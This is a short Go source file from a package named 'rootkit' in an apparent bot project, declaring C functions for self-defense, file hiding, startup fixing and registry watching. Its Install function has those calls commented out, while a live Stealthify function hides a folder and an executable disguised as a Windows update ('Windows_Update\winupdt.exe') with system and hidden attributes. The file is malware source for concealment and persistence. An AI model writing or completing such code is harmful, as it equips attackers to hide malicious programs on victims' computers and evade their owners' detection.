package rootkit

import (
	ghelper "gbot/helper"
	/*
			extern _Bool SelfDefense();
			extern void hideFiles();
			extern void fixStartup();
			extern void WatchReg(char *watch, _Bool watchType);

		"C"
	*/)

// Install will install the C rootkit
func Install() {
	// go C.SelfDefense()
	// go C.WatchReg(C.CString("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"), true)
	// go C.WatchReg(C.CString("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), false)
	// go Stealthify()
}

// Stealthify Hide file and dir
func Stealthify() {
	ghelper.Run("attrib +S +H %APPDATA%\\Windows_Update")
	ghelper.Run("attrib +S +H %APPDATA%\\Windows_Update\\winupdt.exe")
}
